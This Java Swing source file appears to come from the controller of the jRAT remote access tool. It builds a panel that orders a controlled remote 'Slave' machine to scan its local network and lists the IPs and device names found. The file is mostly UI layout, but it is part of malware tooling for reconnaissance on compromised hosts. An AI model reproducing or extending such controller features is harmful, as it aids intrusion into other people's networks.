package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet71LocalNetworkDevices;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;


@SuppressWarnings("serial")
public class PanelControlLANScan extends PanelControlParent {

    private TableModel model;
	private JProgressBar progressBar;
	private JLabel label;

	public TableModel getModel() {
		return model;
	}

	public JLabel getLabel() {
		return label;
	}

	public void starting() {
		progressBar.setIndeterminate(true);
		label.setText("Starting...");
		label.setForeground(Color.black);
	}

	public void done() {
		progressBar.setIndeterminate(false);
		progressBar.setValue(100);
		label.setText("Done");
	}

	public void fail() {
		progressBar.setIndeterminate(false);
		progressBar.setValue(100);
		label.setText("Failed receiving lan computers");
		label.setForeground(Color.red);
	}

	public PanelControlLANScan(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReloadList = new JButton("Reload list");
		btnReloadList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
				starting();
				slave.addToSendQueue(new Packet71LocalNetworkDevices());
			}
		});
		btnReloadList.setIcon(Resources.getIcon("update"));

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClear.setIcon(Resources.getIcon("clear"));

		progressBar = new JProgressBar();
		progressBar.setIndeterminate(true);

		label = new JLabel("...");

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE)
					.addContainerGap())
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(btnReloadList)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnClear)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(progressBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(label)
					.addContainerGap(241, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 298, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING, false)
						.addComponent(label, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
						.addComponent(progressBar, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
						.addComponent(btnReloadList, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
						.addComponent(btnClear, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
					.addContainerGap(16, Short.MAX_VALUE))
		);

        JTable table = new DefaultJTable();
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Local IP", "Computer/Device name" }));
		table.setRowHeight(25);
		table.getColumnModel().getColumn(0).setPreferredWidth(175);
		table.getColumnModel().getColumn(1).setPreferredWidth(422);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
